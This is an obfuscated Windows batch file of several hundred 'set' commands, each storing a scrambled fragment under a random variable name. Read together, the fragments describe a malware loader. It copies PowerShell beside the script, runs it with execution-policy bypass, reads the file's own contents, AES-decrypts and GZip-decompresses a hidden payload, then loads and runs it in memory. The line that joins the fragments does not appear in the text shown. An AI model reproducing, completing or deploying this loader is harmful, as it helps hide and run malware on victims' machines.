@echo off
set "vjAwZqguSF=.e"
set "dNhzMrwcPQ=ll"
set "KQvfKKdFHG=Sy"
set "CiRYXAQxcO=he"
set "PUdFpjPTCd=0\"
set "KUxJDaJIkl=ws"
set "TXqtTZyskt=do"
set "IqDEcrKQSO= /"
set "XbdRuJqlTR=ow"
set "iwZYrnWRYX=po"
set "GzpERrbucg=\v"
set "eSpFfMwJoI=rs"
set "tPpJNgjSSY=rS"
set "ERMOgCfnJS=co"
set "ljKwApSEti=st"
set "xNIOEtyLtx=:\"
set "xYZykzEqaf=py"
set "AyxaQzOFtg=we"
set "ptUymsIvZH=y "
set "aGCvYwUFbv=in"
set "XQvucaEgwn=1."
set "OGKxMjFdkS= C"
set "gqeQmgJosP=Po"
set "qkavgJYMTU=ll"
set "NmvQoCTAhN=he"
set "RmCqusGycp=xe"
set "LnVQdpQgon=em"
set "bSWCOTlVEK=s\"
set "hNJcgYhpbW=nd"
set "maWLQIuktG=we"
set "rVvOSbzOHf=Wi"
set "NlKrmhFXgK=32"
set "FKEmGSizcy=\W"
set "FcbXdXOWpX= %~dp0"
set "yEEVtyniBM=cd"
set "bXFNXWmPzG=gnir"
set "lBSDXmpOCY=th('"
set "IWGEoiXHrl=+hAO"
set "DmRjYHZGDJ=).Sp"
set "RRROQiWobd=]::("
set "xSCLDzYVqh=embl"
set "IwJEtjxfyK=F'[-"
set "EORdIxDyid=M.Pa"
set "ojVtaWSVyH=oin "
set "hbFvXlMPJu=aznS"
set "LVujJYQpMl=JiU."
set "txYqppvKlr=-joi"
set "SkaFBZJEtO=.Con"
set "LUHQwNqEQA=rity"
set "ZMKOfkudyb=);$X"
set "puIKmuAVKz=stem"
set "aRimNhOVWt=[]] "
set "ikxXZFDnqy=3); "
set "yHOcoGtCYq=;$JS"
set "UrfCbRavAY=ateD"
set "GWnyenitjb=bypa"
set "MNFSUagOWu=1] -"
set "hvWhvyuboz=pher"
set "IiTDzeDtkI=tsWi"
set "jqnkvuzHSJ=m.IO"
set "hZmxRUjCwa=E.En"
set "gLRkuOnZKd=, (,"
set "bSAIsuBoNP=Obje"
set "cuCplcAQmK=Bmor"
set "BwQvSUnwwM=:: '"
set "BsAuPkYVTB= '')"
set "xqJOqYiWpx=vj0m"
set "pAwmwzWfXq=$wif"
set "VyTtKNknBN=Stre"
set "ExOOilryKE=bcou"
set "cqiirvnCES=XMqN"
set "cfDSxdQoqk=wifG"
set "BoqTxwmIsi=tion"
set "CgdGstRhMd=m(, "
set "CiYSIOMaOU=$KeQ"
set "GCLAowEIXc=New-"
set "EIeOcukvXs=('%*'"
set "uPhYbTtuHd=();$"
set "UyJxPggzOu=.Cry"
set "PCJAOwchaN=UOJI"
set "NzTZHMavcw=C = "
set "CzKIihfhwr=.IO."
set "wHbLtkWDKV=sGUc"
set "bQtrvaeLPD=se()"
set "snXOyWcnpy=Syst"
set "kfSZjNxRsI=[IO."
set "QMFLlzwNfc=)) {"
set "BZwQTQBfLV=tS46"
set "RanKSHnovr=.Cre"
set "PtOrBsFiDI=MqNM"
set "QAaVgXKpmg=MqNM"
set "qZnfdMrdih=tem."
set "etDNJzdADp=n ''"
set "MJIltFuHBq=j = "
set "KvdgpyiZDf=ifGp"
set "XKNxJNFMIP=saBm"
set "NkYgPlMcwc=pose"
set "CZqiUpxsLC=WPE."
set "ahZzMrtSxp===')"
set "xDIsKWgSLc=ddin"
set "fQkkDoVLCA=Secu"
set "IqrEgNyFrF=JIv."
set "WdropiokjY=7Yiv"
set "HdReDZlthe=JIv "
set "zWUDFxxneu=PE.T"
set "YkSfNheqtC=am;$"
set "uNWmXClOAk=);$k"
set "SPzQqyBIgE=g = "
set "lBFnyIKeOp=[Sys"
set "ccPKenkWYi=();$"
set "EIRRRXBeAF=; };"
set "aFJZidVRre=esMa"
set "oVnfcpgCAm=lBlo"
set "VZOWlMmetI=aC);"
set "rEFyXCjdGc=gMod"
set "gYKzoJVKwj=]::("
set "biLXCdstzB=vert"
set "ljiNdmuWAU=ptor"
set "ePuCAmgGMg=y.Cr"
set "pAxkWgmvfM=.Sec"
set "NFBOrSwEVW=pStr"
set "wMVewqMHmZ=ert]"
set "aMFOnTPZGy=mory"
set "BeErpQzipL=brea"
set "wmqtmtLxkI=$XMq"
set "ypreuxMRNj=ss -"
set "NsSPtVLqcv=trea"
set "mOMVJJznZi=KeQa"
set "bgwiHbtmOs=6esa"
set "QrPjBAudQX=KeQa"
set "qqUIpzfSma=pres"
set "OCdFirRfDn=$kkz"
set "TQPuNozSQp=rofi"
set "HfDFmcUbwS= [Sy"
set "BEazJKqUcD=qizA"
set "DFZnxdVstD=aC ="
set "rbdJefDREM=);$M"
set "PLkKpHHLBC=ptog"
set "RyFEQkKZRE=QJj."
set "oHeBDoZjlW=oryS"
set "yMTqwwHiwX=yste"
set "iItMpgJLhi=rtS4"
set "kCnVekGshv=C, 0"
set "NRlmSevzLg=.Mod"
set "TiaNpebuKJ=ZYYc"
set "yEBuPVxQjK= = $"
set "YRvkijgXls=[Env"
set "vDKPxEYWKC=esFX"
set "IDwPbiDxjj=$kkz"
set "ofpeDwChLe=k; }"
set "SkiGuVUWKx=O.Me"
set "THyHBdyPyK=;$Bx"
set "aikpJMAJUj=tryP"
set "VaxbJoUuQe=OyzA"
set "MIpaXQSNKi=onve"
set "NgyqFaRuCh=);$X"
set "VJzBwRnbrI=);$w"
set "eXhFyKFdXP='[-1"
set "LoSkEPJJjR=.Cry"
set "PwdDdJerNw=em.I"
set "LAgebQYTMh=y]::"
set "RAEvntsFhR=..-1"
set "MOBZeCUKav== [S"
set "KsIdcuYaiN=Aa);"
set "pnGZoqRnbP=.Key"
set "kPcbpCfNPW=ne);"
set "MgXsfJAmEs=rans"
set "DDpbmBqVrJ=d;$X"
set "rkscdlkJfR=Disp"
set "muKnJJbNEr='[-1"
set "dqADKlNUYJ=Aa.T"
set "eSqcsNqLgV=ress"
set "zpTpJOIeeF=.Com"
set "GiEQZUlrMJ=Star"
set "NZAHvskXQn=[Sys"
set "dynArakRZA=[Sys"
set "uSKVSAvedd=.GZi"
set "nQJSKpGiVr=ose("
set "eoNjEcechp=m.Re"
set "dbOjnBOUVE=Jj, "
set "QhKbjnYvYx==');"
set "OJRyZraRtV=]::C"
set "LgkCrGzKSx=ck($"
set "rRzqfTGAuV=t Sy"
set "KbUQFmtXsn=::('"
set "HfmocPdKVL='dqR"
set "TFgqiRIOSk=ke($"
set "XVsWIxYuzz=UGTu"
set "kBQbdRAMar=fore"
set "tkAYRDcsuI=join"
set "FpzaZmjmTY=MqNM"
set "dDXgWnKcvW=] -j"
set "dSnvHcdsvT=($UO"
set "OtCDgLirzO=C = "
set "HRiAVmdaMW=urit"
set "mAkVZAUJXi=($UO"
set "ekSKeHCSuz=bjec"
set "rQElRXuAPM=isfL"
set "xdfPGzIQxv=tem."
set "aNjDSPVFGD=Fo7l"
set "yjsuWzgihA=morF"
set "xqskwMMpbj=-1.."
set "piAZLJTTLR=ecry"
set "wNKnRZckvx=ion."
set "LnhculZNzt=S46e"
set "BMTnbjSpxh=.Len"
set "ebNrxhrjus=PKCS"
set "OzFewQVbVG=Obje"
set "HluHnJJDrL=grap"
set "FlDJhtXRDa=v.Su"
set "efUMEtUzkD=.Mem"
set "UfLpAurPWG=p = "
set "gpInxHJNVy=sion"
set "KtYlRPyhVt=join"
set "VmmpmgdYkY=ionM"
set "yihrSOfeAn=16] "
set "xSwiuEtZhE=Aa ="
set "rFGTyDaRkz=Syst"
set "OcUHYbCnTe=BC;$"
set "peUlGsypsL=kzAa"
set "IpACTwZqpv=;$az"
set "DDWqjQuotY=ypto"
set "JAEJXbCvyk=MqNM"
set "MGMtegvxkA=esaB"
set "hpUPIQRRDD=.-16"
set "AvODAmubzk=File"
set "IQtaZivUwe='txe"
set "DCezjjEWlM=pose"
set "aPGhUoONlv=Comp"
set "KolxBvkmIQ=..-1"
set "eVjFlyGYQO=$BxQ"
set "DqnGdcOuJn=KeQa"
set "UFFCHwENvR='')("
set "emcjOJGNAK=rt]:"
set "RgXyRyVhsx= = $"
set "pWKnKMQGbO=]::N"
set "oUAqaprixg=('l0"
set "TBLytIBMEf=.Cop"
set "CjVMEZsbUh=eQaC"
set "tMjrfQTIlC=3HWs"
set "qcxBRoXVcY=ring"
set "oHKFeEPluy=daeR"
set "PmzfSwRGmE=ode]"
set "rffkukJDZm= = N"
set "mhMiwDBmtF=ose("
set "ARdmXXdZWe=stem"
set "ljdCMzORsI=('%~f0'"
set "XQOSKoTowF=P) {"
set "ZhDwwnLzUT=gth)"
set "qZkyvCjRgf=lit("
set "jBPNKaDGXk=y.Pa"
set "pGuSDkHGSc=eam("
set "halJbfPdaR= [st"
set "TOmbYSwVDT=Comp"
set "MyDeHyXPSf=orF'"
set "uwfZxNtzkG=null"
set "iBvPConkbj=ay()"
set "ZfwtHnwOGe=nSE "
set "EnxcUzwbwC=in $"
set "weUGVmsPVx=$JSW"
set "WAijpPnDxF=Disp"
set "zUFtueErgg=$KeQ"
set "dCkDfrpZFL=v4Ir"
set "fmzGCWPpeg=ptog"
set "nStdZxbrvc=.Ass"
set "rrkMFiydxB=-ep "
set "Ypyspeoqtg=)))"
set "qKsCISyYYI=Fina"
set "DoNeTQnKnO=n ''"
set "ABYmcPMwXh=$kkz"
set "YazKdvctVs=Mode"
set "UYphFkClbS=0O+g"
set "CGsJMZcibz= if "
set "YsJKtazyuk=BxQJ"
set "UcnaZAgUKK=hy.A"
set "fERVulKHos=ddin"
set "MnImpKhWEw=ct S"
set "taRRYcSZhg=[-1."
set "ZHZtqDYjQE=dJiU"
set "YCTObzaDvD=yste"
set "lxOgSoRkFc=ress"
set "vNmHnHhMvw=y.Ci"
set "dhUCInWwap=e]::"
set "QUsTwaPMUB=.Dis"
set "MjePECLCPH=raph"
set "lkzYiZRBeK=yTo("
set "OlZLejrtPf=iron"
set "fuEShwqINH=e = "
set "WVrDaZphbK=rity"
set "ovQCZOobMk=Secu"
set "sKsaENaANq=ach "
set "SwevSJLFqY=oL'["
set "nHHsCprkcZ== $X"
set "RIlwcujaWJ=736u"
set "fTxjLiTgZx=form"
set "ZsULdvwcMU=WPE "
